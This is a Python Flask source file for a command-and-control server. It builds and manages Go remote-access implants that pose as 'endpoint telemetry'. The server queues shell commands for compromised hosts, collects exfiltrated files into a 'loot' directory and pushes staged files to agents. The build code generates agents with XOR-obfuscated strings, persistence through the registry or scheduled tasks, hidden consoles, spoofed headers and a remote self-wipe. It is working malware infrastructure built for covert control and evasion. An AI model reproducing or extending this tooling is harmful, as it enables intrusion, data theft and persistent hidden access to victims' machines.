from flask import Flask, request, jsonify, render_template, send_file, Response
from werkzeug.utils import secure_filename
from database import get_db_connection
from crypto import generate_key, encrypt_payload, decrypt_payload
from datetime import datetime, timezone
import hmac
import json
import subprocess
import shutil
import tempfile
import os

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100 MB upload limit

# Swap out the default Werkzeug Server header so the stack isn't fingerprinted from traffic.
@app.after_request
def mask_server_header(response):
    response.headers["Server"] = "nginx/1.24.0"
    return response

# Directory where compiled agent binaries are stored
BUILDS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "builds")
os.makedirs(BUILDS_DIR, exist_ok=True)

# Directory for exfiltrated files (loot)
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT_DIR, exist_ok=True)

# Directory for staged files (to push to agents)
STAGED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "staged")
os.makedirs(STAGED_DIR, exist_ok=True)

# Path to the agent source code (relative to server/)
AGENT_SRC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "agent")


# -- agent path init --

def _init_agent_paths():
    """Pull path slugs from the DB, generate them on first run."""
    import secrets

    keys = ["path_checkin", "path_result", "path_upload", "path_files"]

    conn = get_db_connection()
    rows = conn.execute(
        "SELECT key, value FROM server_config WHERE key IN (?, ?, ?, ?)", keys
    ).fetchall()
    stored = {r["key"]: r["value"] for r in rows}

    # Generate any missing paths (first run, or partial DB state)
    for k in keys:
        if k not in stored:
            stored[k] = "/" + secrets.token_hex(4)
            conn.execute(
                "INSERT INTO server_config (key, value) VALUES (?, ?)",
                (k, stored[k]),
            )

    conn.commit()
    conn.close()
    return stored


_agent_paths = _init_agent_paths()

# used by route registration and the build pipeline
AGENT_PATH_CHECKIN = _agent_paths["path_checkin"]
AGENT_PATH_RESULT  = _agent_paths["path_result"]
AGENT_PATH_UPLOAD  = _agent_paths["path_upload"]
AGENT_PATH_FILES   = _agent_paths["path_files"]


# -- operator API key --

def _init_api_key():
    """Pull the operator API key from the DB, generate it if this is the first run."""
    import secrets

    conn = get_db_connection()
    row = conn.execute(
        "SELECT value FROM server_config WHERE key = 'api_key'"
    ).fetchone()

    if row:
        key = row["value"]
    else:
        key = secrets.token_hex(16)
        conn.execute(
            "INSERT INTO server_config (key, value) VALUES (?, ?)",
            ("api_key", key),
        )
        conn.commit()

    conn.close()
    return key


API_KEY = _init_api_key()


@app.before_request
def _require_api_key():
    """Gate every operator endpoint behind the API key."""
    if request.path.startswith("/api/"):
        provided = request.headers.get("X-API-Key", "")
        if not hmac.compare_digest(provided, API_KEY):
            return jsonify({"error": "Unauthorized"}), 401


# -- dashboard --

@app.route("/")
def dashboard():
    """Render the C2 operator dashboard."""
    return render_template("index.html")


# -- agent checkin --

def SyncDeviceState():
    """Decrypt the checkin envelope, register/update the agent, return pending tasks encrypted."""
    envelope = request.get_json()

    # Validate envelope
    if not envelope or "kid" not in envelope or "data" not in envelope:
        return jsonify({"error": "Invalid envelope"}), 400

    kid = envelope["kid"]
    key_hex = _get_key_for_kid(kid)
    if not key_hex:
        return jsonify({"error": "Unknown key_id"}), 403

    # Decrypt the inner payload
    try:
        raw  = decrypt_payload(key_hex, envelope["data"])
        data = json.loads(raw)
    except Exception:
        return jsonify({"error": "Decryption failed"}), 403

    if "agent_id" not in data:
        return jsonify({"error": "Missing agent_id"}), 400

    agent_id   = data["agent_id"]
    hostname   = data.get("hostname", "unknown")
    agent_os   = data.get("os", "unknown")
    ip         = request.remote_addr

    conn = get_db_connection()

    existing = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()

    if existing:
        conn.execute(
            "UPDATE agents SET hostname = ?, ip = ?, os = ?, last_seen = ? WHERE id = ?",
            (hostname, ip, agent_os, datetime.now(timezone.utc).isoformat(), agent_id),
        )
    else:
        conn.execute(
            "INSERT INTO agents (id, hostname, ip, os, last_seen) VALUES (?, ?, ?, ?, ?)",
            (agent_id, hostname, ip, agent_os, datetime.now(timezone.utc).isoformat()),
        )

    conn.commit()

    tasks = conn.execute(
        "SELECT id, command, type FROM tasks WHERE agent_id = ? AND status = 'pending'",
        (agent_id,),
    ).fetchall()

    for task in tasks:
        conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task["id"],))

    conn.commit()
    conn.close()

    # Encrypt the response before sending it back
    response_body = {
        "status": "ok",
        "tasks": [{"id": t["id"], "command": t["command"], "type": t["type"]} for t in tasks],
    }
    enc = encrypt_payload(key_hex, json.dumps(response_body).encode())
    return jsonify({"kid": kid, "data": enc})


# -- crypto helpers --

def _get_key_for_kid(kid: str) -> str | None:
    """Look up the AES key for a given kid. Returns hex string or None."""
    conn = get_db_connection()
    row = conn.execute(
        "SELECT encryption_key FROM builds WHERE key_id = ?", (kid,)
    ).fetchone()
    conn.close()
    return row["encryption_key"] if row else None


# -- task management --

@app.route("/api/task", methods=["POST"])
def submit_task():
    """Queue a command for an agent."""
    data = request.get_json()

    if not data or "agent_id" not in data or "command" not in data:
        return jsonify({"error": "Missing agent_id or command"}), 400

    task_type = data.get("type", "shell")
    if task_type not in ("exec", "shell"):
        return jsonify({"error": "Invalid task type. Must be 'exec' or 'shell'"}), 400

    conn = get_db_connection()
    cursor = conn.execute(
        "INSERT INTO tasks (agent_id, command, type) VALUES (?, ?, ?)",
        (data["agent_id"], data["command"], task_type),
    )
    task_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "task_id": task_id})


@app.route("/api/tasks/<agent_id>", methods=["GET"])
def get_tasks(agent_id):
    """Get all tasks for a specific agent."""
    conn = get_db_connection()
    tasks = conn.execute(
        "SELECT id, command, type, status, created_at FROM tasks WHERE agent_id = ? ORDER BY created_at DESC",
        (agent_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "tasks": [
            {
                "id": t["id"],
                "command": t["command"],
                "type": t["type"],
                "status": t["status"],
                "created_at": t["created_at"],
            }
            for t in tasks
        ]
    })


# -- results --

def submit_result():
    """Decrypt the result envelope from the agent and store the output."""
    envelope = request.get_json()

    # Validate and decrypt
    if not envelope or "kid" not in envelope or "data" not in envelope:
        return jsonify({"error": "Invalid envelope"}), 400

    kid = envelope["kid"]
    key_hex = _get_key_for_kid(kid)
    if not key_hex:
        return jsonify({"error": "Unknown key_id"}), 403

    try:
        raw  = decrypt_payload(key_hex, envelope["data"])
        data = json.loads(raw)
    except Exception:
        return jsonify({"error": "Decryption failed"}), 403

    if "task_id" not in data:
        return jsonify({"error": "Missing task_id"}), 400

    # Store result and handle self-destruct cleanup
    conn = get_db_connection()
    conn.execute(
        "INSERT INTO results (task_id, output) VALUES (?, ?)",
        (data["task_id"], data.get("output", "")),
    )
    conn.execute("UPDATE tasks SET status = 'complete' WHERE id = ?", (data["task_id"],))
    conn.commit()

    task = conn.execute(
        "SELECT agent_id, command FROM tasks WHERE id = ?", (data["task_id"],)
    ).fetchone()

    if task and task["command"] == "__flush_cache__":
        agent_id = task["agent_id"]
        conn.execute("""
            DELETE FROM results WHERE task_id IN (
                SELECT id FROM tasks WHERE agent_id = ?
            )
        """, (agent_id,))
        conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        conn.commit()

    conn.close()

    # Encrypt the response
    enc = encrypt_payload(key_hex, json.dumps({"status": "ok"}).encode())
    return jsonify({"kid": kid, "data": enc})


@app.route("/api/results/<int:task_id>", methods=["GET"])
def get_results(task_id):
    """Get results for a specific task."""
    conn = get_db_connection()
    results = conn.execute(
        "SELECT id, output, received_at FROM results WHERE task_id = ?",
        (task_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "results": [
            {
                "id": r["id"],
                "output": r["output"],
                "received_at": r["received_at"],
            }
            for r in results
        ]
    })


# -- agents --

@app.route("/api/agents", methods=["GET"])
def get_agents():
    """Return all agents as JSON."""
    conn = get_db_connection()
    agents = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    conn.close()

    return jsonify({
        "agents": [
            {
                "id": a["id"],
                "hostname": a["hostname"],
                "ip": a["ip"],
                "os": a["os"],
                "last_seen": a["last_seen"],
            }
            for a in agents
        ]
    })


@app.route("/api/agents/<agent_id>", methods=["DELETE"])
def delete_agent(agent_id):
    """Queue a self-destruct for the agent. Record stays in the DB until the agent checks in and wipes itself."""
    conn = get_db_connection()

    # Check if agent exists
    agent = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
    if not agent:
        conn.close()
        return jsonify({"error": "Agent not found"}), 404

    # Check if a self-destruct task is already pending
    existing = conn.execute(
        "SELECT id FROM tasks WHERE agent_id = ? AND command = '__flush_cache__' AND status = 'pending'",
        (agent_id,),
    ).fetchone()

    if not existing:
        # Queue the self-destruct command
        conn.execute(
            "INSERT INTO tasks (agent_id, command) VALUES (?, '__flush_cache__')",
            (agent_id,),
        )
        conn.commit()

    conn.close()

    return jsonify({"status": "ok", "message": "Self-destruct queued. Agent will wipe on next check-in."})


@app.route("/api/agents/<agent_id>/force", methods=["DELETE"])
def force_delete_agent(agent_id):
    """Force-remove an agent record and all its data from the database (no remote wipe)."""
    conn = get_db_connection()

    conn.execute("""
        DELETE FROM results WHERE task_id IN (
            SELECT id FROM tasks WHERE agent_id = ?
        )
    """, (agent_id,))
    conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))

    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# -- stats --

@app.route("/api/stats", methods=["GET"])
def get_stats():
    """Return aggregate dashboard statistics."""
    conn = get_db_connection()

    agent_count = conn.execute("SELECT COUNT(*) as c FROM agents").fetchone()["c"]
    pending_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'pending'").fetchone()["c"]
    sent_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'sent'").fetchone()["c"]
    complete_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'complete'").fetchone()["c"]
    total_builds = conn.execute("SELECT COUNT(*) as c FROM builds").fetchone()["c"]

    conn.close()

    return jsonify({
        "agents": agent_count,
        "pending": pending_tasks,
        "sent": sent_tasks,
        "completed": complete_tasks,
        "builds": total_builds,
    })


# -- build --

def _xor_encrypt(key: bytes, plaintext: str) -> str:
    """XOR-encrypt a plaintext string with a multi-byte key, return hex."""
    pt = plaintext.encode()
    ct = bytes(b ^ key[i % len(key)] for i, b in enumerate(pt))
    return ct.hex()


def _compute_cert_pin():
    """Read the server certificate and return the SPKI SHA-256 hex digest.

    Returns None if no certificate exists yet.
    """
    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
    if not os.path.exists(cert_path):
        return None

    from cryptography.x509 import load_pem_x509_certificate
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    import hashlib

    with open(cert_path, "rb") as f:
        cert = load_pem_x509_certificate(f.read())

    spki_bytes = cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    return hashlib.sha256(spki_bytes).hexdigest()


def _generate_config_go(server_url, jitter_min, jitter_max, persist_method,
                        profile_id=1, locale="en-US,en;q=0.9",
                        key_hex="", key_id="",
                        path_checkin="/api/checkin", path_result="/api/result",
                        path_upload="/api/upload", path_files="/api/files/",
                        cert_pin=""):
    """Generate a config.go file with the given settings."""

    # fresh XOR key for this build
    xor_key = os.urandom(32)
    xor_key_hex = xor_key.hex()

    persistence = persist_method != "none"

    # encrypt sensitive strings so they don't show up as plaintext in the binary
    enc_server_url   = _xor_encrypt(xor_key, server_url)
    enc_checkin_path = _xor_encrypt(xor_key, path_checkin)
    enc_result_path  = _xor_encrypt(xor_key, path_result)
    enc_upload_path  = _xor_encrypt(xor_key, path_upload)
    enc_files_path   = _xor_encrypt(xor_key, path_files)
    enc_flush_cmd    = _xor_encrypt(xor_key, "__flush_cache__")
    enc_svc_label    = _xor_encrypt(xor_key, "EndpointAutoUpdate")
    enc_cert_pin     = _xor_encrypt(xor_key, cert_pin) if cert_pin else ""
    enc_update_strat = _xor_encrypt(xor_key, persist_method) if persistence else ""

    return f'''package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"endpoint-telemetry/funcs"
)

var (
	// XOR key for runtime string decoding (generated per build)
	obfKey = parseDiagnosticKey("{xor_key_hex}")

	// Sensitive strings decoded at init time
	TelemetryEndpoint string
	PathCheckin       string
	PathResult        string
	PathUpload        string
	PathFiles         string
	FlushCommand      string
	ServiceTag        string
	UpdateStrategy    string

	SyncDelayMin  = {jitter_min} * time.Second
	SyncDelayMax  = {jitter_max} * time.Second
	ProfileID     = {profile_id}
	Locale        = "{locale}"
	EndpointID    string
	EnablePersist = {str(persistence).lower()}

	// Per-build AES-256-GCM key
	KeyID         = "{key_id}"
	EncryptionKey = parseDiagnosticKey("{key_hex}")

	// SPKI SHA-256 pin of the server TLS certificate (empty = no pinning)
	CertPin string
)

// parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
// If this panics at startup the binary was built with a malformed key.
func parseDiagnosticKey(s string) []byte {{
	b, err := hex.DecodeString(s)
	if err != nil {{
		panic("config: invalid key hex: " + err.Error())
	}}
	return b
}}

func assignEndpointID() string {{
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40 // version 4
	b[8] = (b[8] & 0x3f) | 0x80 // variant 10
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}}

func InitializeTelemetry() {{
	// Decode all XOR-obfuscated strings into memory on startup.
	TelemetryEndpoint = funcs.ResolveConfig(obfKey, "{enc_server_url}")
	PathCheckin       = funcs.ResolveConfig(obfKey, "{enc_checkin_path}")
	PathResult        = funcs.ResolveConfig(obfKey, "{enc_result_path}")
	PathUpload        = funcs.ResolveConfig(obfKey, "{enc_upload_path}")
	PathFiles         = funcs.ResolveConfig(obfKey, "{enc_files_path}")
	FlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
	ServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
	funcs.ServiceLabel = ServiceTag
	if "{enc_update_strat}" != "" {{
		UpdateStrategy = funcs.ResolveConfig(obfKey, "{enc_update_strat}")
		funcs.UpdateStrategy = UpdateStrategy
	}}
	if "{enc_cert_pin}" != "" {{
		CertPin = funcs.ResolveConfig(obfKey, "{enc_cert_pin}")
	}}

	// If a pin is baked in but the URL is HTTP, something went wrong at build time.
	// Panic rather than run in a broken state where pinning is silently skipped.
	if CertPin != "" && !strings.HasPrefix(TelemetryEndpoint, "https://") {{
		panic("config: cert pin is set but server URL is not HTTPS")
	}}

	EndpointID = assignEndpointID()

	profile, ok := funcs.Profiles[ProfileID]
	if !ok {{
		profile = funcs.Profiles[1] // fallback to Chrome/Windows
	}}

	// Set Accept-Language from the locale baked in at build time
	profile.Headers["Accept-Language"] = Locale

	// Clone the default transport so we can set TLS options without touching
	// the global default. If a pin is set, disable CA verification (which would
	// reject self-signed certs) and replace it with the SPKI pin check.
	baseTransport := http.DefaultTransport.(*http.Transport).Clone()

	if CertPin != "" {{
		baseTransport.TLSClientConfig = &tls.Config{{
			InsecureSkipVerify: true,
			VerifyPeerCertificate: funcs.MakePinVerifier(CertPin),
		}}
	}}

	// Swap in our custom client so all outbound requests go through the
	// browser profile transport rather than the plain default client.
	http.DefaultClient = &http.Client{{
		Transport: &funcs.UATransport{{
			Base:    baseTransport,
			Profile: profile,
		}},
	}}

	fmt.Println("=======================================")
	fmt.Println("   Endpoint Telemetry  Initialized     ")
	fmt.Println("=======================================")
	fmt.Printf("  Endpoint  : %s\\n", EndpointID)
	fmt.Printf("  Gateway   : %s\\n", TelemetryEndpoint)
	fmt.Printf("  Interval  : %s to %s\\n", SyncDelayMin, SyncDelayMax)
	fmt.Printf("  Profile   : %s\\n", profile.Name)
	fmt.Printf("  Locale    : %s\\n", Locale)
	fmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)

	hostname, err := os.Hostname()
	if err == nil {{
		fmt.Printf("  Hostname  : %s\\n", hostname)
	}}

	fmt.Println("=======================================")
}}

'''


def _generate_main_go(persist_method):
    """Generate main.go, optionally with persistence call."""
    persist_block = ""
    if persist_method != "none":
        persist_block = """
\t// Register auto-update service
\tif EnablePersist {{
\t\tif err := funcs.InstallAutoUpdater(); err != nil {{
\t\t\tfmt.Printf("[!] Auto-update registration failed: %v\\n", err)
\t\t}} else {{
\t\t\tfmt.Println("[+] Auto-update registered successfully")
\t\t}}
\t}}
"""

    return f'''package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"

	"endpoint-telemetry/funcs"
)

type DeviceTelemetryPayload struct {{
	EndpointID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}}

type SyncResponse struct {{
	Status string          `json:"status"`
	Jobs   []DiagnosticJob `json:"tasks"`
}}

type DiagnosticJob struct {{
	ID      int    `json:"id"`
	Command string `json:"command"`
	Type    string `json:"type"`
}}

type DiagnosticOutput struct {{
	JobID int    `json:"task_id"`
	Output string `json:"output"`
}}

func main() {{
	InitializeTelemetry()
{persist_block}
	hostname, _ := os.Hostname()
	agentOS := runtime.GOOS

	fmt.Printf("\\n[*] Starting check-in loop (jitter: %s - %s)…\\n\\n", SyncDelayMin, SyncDelayMax)

	for {{
		jobs, err := SyncDeviceState(hostname, agentOS)
		if err != nil {{
			fmt.Printf("[!] Check-in failed: %v\\n", err)
			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
			continue
		}}

		fmt.Printf("[+] Checked in - %d pending job(s)\\n", len(jobs))

		for _, job := range jobs {{
			fmt.Printf("[>] Executing job #%d: %s\\n", job.ID, job.Command)

			if job.Command == FlushCommand {{
				fmt.Println("[!] Cache flush command received from server")
				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
				funcs.WipeLocalCacheAndExit()
			}}

			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
			if funcs.IsPathUpdate(job.Command) {{
				output, cdErr := funcs.ExecuteDiagnosticTask(job.Command)
				if cdErr != nil {{
					output = fmt.Sprintf("Error: %v", cdErr)
				}}
				fmt.Printf("[<] Job #%d result: %s\\n", job.ID, output)
				_ = SubmitDiagnosticReport(job.ID, output)
				continue
			}}

			if strings.HasPrefix(job.Command, "get ") {{
				go func(t DiagnosticJob) {{
					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath)
					if err != nil {{
						output = fmt.Sprintf("Upload error: %v", err)
					}}
					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
					_ = SubmitDiagnosticReport(t.ID, output)
				}}(job)
				continue
			}}

			if strings.HasPrefix(job.Command, "download ") {{
				go func(t DiagnosticJob) {{
					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
					parts := strings.SplitN(args, " ", 2)
					if len(parts) != 2 {{
						_ = SubmitDiagnosticReport(t.ID, "Usage: download <file_id> <save_path>")
						return
					}}
					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]))
					if err != nil {{
						output = fmt.Sprintf("Download error: %v", err)
					}}
					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
					_ = SubmitDiagnosticReport(t.ID, output)
				}}(job)
				continue
			}}

			go func(t DiagnosticJob) {{
				var output string
				var execErr error

				switch t.Type {{
				case "exec":
					output, execErr = funcs.RunDiagnosticProbe(t.Command)
				default:
					output, execErr = funcs.ExecuteDiagnosticTask(t.Command)
				}}

				if execErr != nil && output == "" {{
					output = fmt.Sprintf("Error: %v", execErr)
				}}
				fmt.Printf("[<] Job #%d result (%d bytes)\\n", t.ID, len(output))
				err := SubmitDiagnosticReport(t.ID, output)
				if err != nil {{
					fmt.Printf("[!] Failed to send result for job #%d: %v\\n", t.ID, err)
				}}
			}}(job)
		}}

		funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
	}}
}}

func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {{
	payload := DeviceTelemetryPayload{{
		EndpointID:  EndpointID,
		Hostname: hostname,
		OS:       agentOS,
	}}

	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
	if err != nil {{
		return nil, err
	}}

	// Unwrap the encrypted response envelope
	var envelope struct {{
		Data string `json:"data"`
	}}
	if err := json.Unmarshal(respBody, &envelope); err != nil {{
		return nil, fmt.Errorf("envelope unmarshal: %w", err)
	}}

	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
	if err != nil {{
		return nil, fmt.Errorf("decrypt checkin response: %w", err)
	}}

	var result SyncResponse
	if err := json.Unmarshal(plain, &result); err != nil {{
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}}
	return result.Jobs, nil
}}

func SubmitDiagnosticReport(jobID int, output string) error {{
	payload := DiagnosticOutput{{
		JobID: jobID,
		Output: output,
	}}
	_, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
	return err
}}

// transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
// wraps the ciphertext in a {{kid, data}} envelope, and POSTs it.
// Returns the raw response body so the caller can decrypt if needed.
func transmitSecureTelemetry(url string, payload any) ([]byte, error) {{
	inner, err := json.Marshal(payload)
	if err != nil {{
		return nil, fmt.Errorf("marshal: %w", err)
	}}

	enc, err := funcs.SealTelemetry(EncryptionKey, inner)
	if err != nil {{
		return nil, fmt.Errorf("encrypt: %w", err)
	}}

	envelope := map[string]string{{"kid": KeyID, "data": enc}}
	body, err := json.Marshal(envelope)
	if err != nil {{
		return nil, fmt.Errorf("envelope marshal: %w", err)
	}}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {{
		return nil, fmt.Errorf("post: %w", err)
	}}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {{
		return nil, fmt.Errorf("read response: %w", err)
	}}

	if resp.StatusCode != 200 {{
		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(respBody))
	}}

	return respBody, nil
}}

'''


@app.route("/api/build", methods=["POST"])
def build_agent():
    """Compile an agent binary with the given config and return the build ID."""
    data = request.get_json()

    if not data:
        return jsonify({"error": "Missing request body"}), 400

    target_os = data.get("target_os", "windows")
    arch = data.get("arch", "amd64")
    server_url = data.get("server_url", "http://localhost:5000")
    jitter_min_raw = data.get("jitter_min", "8")
    jitter_max_raw = data.get("jitter_max", "15")
    persist_method = data.get("persist_method", "none")
    valid_persist = ("none", "registry", "scheduled_task")
    if persist_method not in valid_persist:
        return jsonify({"error": f"persist_method must be one of: {', '.join(valid_persist)}"}), 400
    profile_id = data.get("profile_id", 1)
    locale = data.get("locale", "en-US,en;q=0.9")

    # Validate target OS
    valid_os = ["windows", "linux", "mac"]
    if target_os not in valid_os:
        return jsonify({"error": f"Invalid target_os. Must be one of: {valid_os}"}), 400

    # macOS has no persistence implementation; reject at build time rather than silently failing at runtime
    if target_os == "mac" and persist_method != "none":
        return jsonify({"error": "macOS agents do not support persistence. Set persist_method to 'none'."}), 400

    # Validate architecture
    valid_arch = ["amd64", "arm64", "386"]
    if arch not in valid_arch:
        return jsonify({"error": f"Invalid arch. Must be one of: {valid_arch}"}), 400

    # Parse jitter_min
    try:
        jitter_min = int(jitter_min_raw)
        if jitter_min < 1 or jitter_min > 3600:
            return jsonify({"error": "jitter_min must be between 1 and 3600 seconds"}), 400
    except ValueError:
        return jsonify({"error": "jitter_min must be a number (seconds)"}), 400

    # Parse jitter_max
    try:
        jitter_max = int(jitter_max_raw)
        if jitter_max < 1 or jitter_max > 3600:
            return jsonify({"error": "jitter_max must be between 1 and 3600 seconds"}), 400
    except ValueError:
        return jsonify({"error": "jitter_max must be a number (seconds)"}), 400

    if jitter_min >= jitter_max:
        return jsonify({"error": "jitter_min must be less than jitter_max"}), 400

    # Validate server URL
    if not server_url.startswith("http://") and not server_url.startswith("https://"):
        return jsonify({"error": "Server URL must start with http:// or https://"}), 400

    # For HTTPS builds, read the cert and compute the pin to bake into the binary.
    # We block the build here if no cert exists rather than letting it compile
    # a broken agent that silently fails at connection time.
    cert_pin = None
    if server_url.startswith("https://"):
        cert_pin = _compute_cert_pin()
        if cert_pin is None:
            return jsonify({"error": "Server URL is HTTPS but no certificate found in server/certs/. Run gen_cert.py first."}), 400

    # Validate profile_id
    try:
        profile_id = int(profile_id)
        if profile_id < 1 or profile_id > 5:
            return jsonify({"error": "profile_id must be between 1 and 5"}), 400
    except (ValueError, TypeError):
        return jsonify({"error": "profile_id must be a number (1-5)"}), 400

    # basic locale format check
    import re as _re
    if not _re.match(r'^[a-zA-Z0-9\-,;=. ]+$', locale):
        return jsonify({"error": "Invalid locale format"}), 400

    # Build filename
    ext = ".exe" if target_os == "windows" else ""
    filename = f"agent_{target_os}_{arch}{ext}"

    # Create temp directory for the build
    tmp_dir = tempfile.mkdtemp(prefix="c2_build_")

    try:
        # Copy agent source to temp directory
        agent_src = os.path.abspath(AGENT_SRC_DIR)
        tmp_agent = os.path.join(tmp_dir, "agent")
        shutil.copytree(agent_src, tmp_agent)

        # Generate key for this build
        key_hex, key_id = generate_key()

        # Generate custom config.go
        config_content = _generate_config_go(
            server_url, jitter_min, jitter_max, persist_method, profile_id, locale,
            key_hex=key_hex, key_id=key_id,
            path_checkin=AGENT_PATH_CHECKIN,
            path_result=AGENT_PATH_RESULT,
            path_upload=AGENT_PATH_UPLOAD,
            path_files=AGENT_PATH_FILES + "/",
            cert_pin=cert_pin or "",
        )
        with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
            f.write(config_content)

        # Generate main.go with optional persistence
        main_content = _generate_main_go(persist_method)
        with open(os.path.join(tmp_agent, "main.go"), "w", encoding="utf-8") as f:
            f.write(main_content)

        # Build the binary
        output_path = os.path.join(tmp_dir, filename)
        env = os.environ.copy()
        env["GOOS"] = "darwin" if target_os == "mac" else target_os
        env["GOARCH"] = arch
        env["CGO_ENABLED"] = "0"

        # strip debug symbols and DWARF
        ldflags = "-s -w"

        # no console window on Windows
        if target_os == "windows":
            ldflags += " -H=windowsgui"

        ldflags += " -buildid="

        result = subprocess.run(
            ["go", "build", "-trimpath", "-ldflags", ldflags, "-o", output_path, "."],
            cwd=tmp_agent,
            env=env,
            capture_output=True,
            text=True,
            timeout=120,
        )

        if result.returncode != 0:
            error_msg = result.stderr or result.stdout or "Unknown build error"
            return jsonify({"error": f"Build failed: {error_msg}"}), 500

        # Move binary to builds directory
        final_path = os.path.join(BUILDS_DIR, filename)

        # If file already exists, add a timestamp
        if os.path.exists(final_path):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            name, extension = os.path.splitext(filename)
            filename = f"{name}_{timestamp}{extension}"
            final_path = os.path.join(BUILDS_DIR, filename)

        shutil.move(output_path, final_path)
        file_size = os.path.getsize(final_path)

        # save build record
        conn = get_db_connection()
        cursor = conn.execute(
            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key, cert_pin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", persist_method, final_path, file_size, key_id, key_hex, cert_pin),
        )
        build_id = cursor.lastrowid
        conn.commit()
        conn.close()

        return jsonify({
            "status": "ok",
            "build_id": build_id,
            "filename": filename,
            "file_size": file_size,
            "tls_pinned": cert_pin is not None,
            "cert_pin_prefix": cert_pin[:16] + "..." if cert_pin else None,
        })

    except subprocess.TimeoutExpired:
        return jsonify({"error": "Build timed out (120s limit)"}), 500
    except Exception as e:
        return jsonify({"error": f"Build error: {str(e)}"}), 500
    finally:
        # Clean up temp directory
        shutil.rmtree(tmp_dir, ignore_errors=True)


@app.route("/api/tls/status", methods=["GET"])
def tls_status():
    """Read the cert on disk and return its details plus the SPKI pin."""
    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
    key_path  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.key")

    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        return jsonify({"enabled": False, "cert": None})

    from cryptography.x509 import load_pem_x509_certificate
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    import hashlib

    with open(cert_path, "rb") as f:
        cert = load_pem_x509_certificate(f.read())

    spki_bytes = cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    pin = hashlib.sha256(spki_bytes).hexdigest()

    san_list = []
    try:
        from cryptography.x509.extensions import SubjectAlternativeName
        from cryptography.x509 import DNSName, IPAddress
        san_ext = cert.extensions.get_extension_for_class(SubjectAlternativeName)
        for name in san_ext.value:
            if isinstance(name, DNSName):
                san_list.append({"type": "dns", "value": name.value})
            elif isinstance(name, IPAddress):
                san_list.append({"type": "ip", "value": str(name.value)})
    except Exception:
        pass

    return jsonify({
        "enabled": True,
        "cert": {
            "cn": cert.subject.get_attributes_for_oid(
                __import__("cryptography.x509.oid", fromlist=["NameOID"]).NameOID.COMMON_NAME
            )[0].value,
            "not_valid_before": cert.not_valid_before_utc.isoformat(),
            "not_valid_after":  cert.not_valid_after_utc.isoformat(),
            "serial": str(cert.serial_number),
            "san": san_list,
            "spki_pin": pin,
        },
    })


